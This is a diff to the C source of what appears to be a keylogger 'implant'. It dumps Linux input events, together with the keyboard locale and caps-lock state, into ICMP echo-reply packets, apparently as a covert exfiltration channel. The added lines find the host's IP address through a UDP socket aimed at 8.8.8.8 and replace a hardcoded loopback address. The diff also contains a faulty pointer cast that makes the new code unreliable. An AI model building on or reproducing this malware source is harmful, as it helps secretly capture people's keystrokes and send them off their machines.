@@ -1,6 +1,12 @@
 
 #include <linux/input.h>
 
+#include <stdint.h>
+#include <sys/socket.h>
+#include <sys/ioctl.h>
+#include <net/if.h>
+#include <arpa/inet.h>
+#include <netinet/in.h>
 #include <string.h>
 #include <arpa/inet.h>
 #include <netinet/ip.h>
@@ -8,6 +14,58 @@
 #include <stdio.h>
 #include <unistd.h>
 #include "implant.h"
+
+static int retrieve_ip_address(char *ip[32]) {
+
+    /* open UDP socket to resolver google DNS, retrieve IP address in resp */
+
+    const char *resolver = "8.8.8.8";
+    const uint16_t dns_port = 53;
+
+    int sockfd = socket(AF_INET, SOCK_DGRAM, 0);
+if (sockfd < 0) {
+#ifdef DEBUG
+        DEBUG_LOG("[+] could not load UDP socket in retrieve_ip_address()\n");
+        perror("socket");
+#endif
+
+cleanup_close_socket:
+        close(sockfd);
+        return 0;
+    }
+
+    struct sockaddr_in serv = {0};
+    serv.sin_family = AF_INET;
+    serv.sin_addr.s_addr = inet_addr(resolver);
+    serv.sin_port = htons(dns_port);
+
+    if (-1 == connect(sockfd,  (const struct sockaddr*)&serv, sizeof(serv))) {
+#ifdef DEBUG
+        DEBUG_LOG("[+] could not connect to %s (port: %d)\n", resolver, dns_port);
+        perror("connect");
+#endif
+
+        goto cleanup_close_socket;
+    }
+
+    struct sockaddr_in name;
+    socklen_t namelen = sizeof(name);
+    if (-1 == getsockname(sockfd, (struct sockaddr*) &name, &namelen)) {
+#ifdef DEBUG
+        DEBUG_LOG("[+] could not get socket name\n");
+        perror("getsockname");
+#endif
+
+        goto cleanup_close_socket;
+    }
+
+    // TODO(djnn): testing testing testing
+
+    const char* p = inet_ntop(AF_INET, &name.sin_addr, *ip, 32);
+
+    close(sockfd);
+    return 1;
+}
 
 /* Layout of the DATA packet is following
  * [ Locale (length: 31), using_cap_lock, struct input_event dump ]
@@ -70,8 +128,15 @@ cleanup_error:
 
     /* set packet metadata */
 
-    /* TODO(djnn): retrieve IP address */
-    char local_ip[32] = "127.0.0.1";
+    char local_ip[32] = {0};
+    if (!retrieve_ip_address((char **)&local_ip)) {
+#ifdef DEBUG
+        DEBUG_LOG("[+] could not get public ip address\n");
+#endif
+
+        goto cleanup_error;
+    }
+
     int packet_type = ICMP_ECHOREPLY;
 
     struct iphdr *ip = NULL;
@@ -86,4 +151,6 @@ cleanup_error:
 
     return SUCCESSFUL;
 }
+
+
 
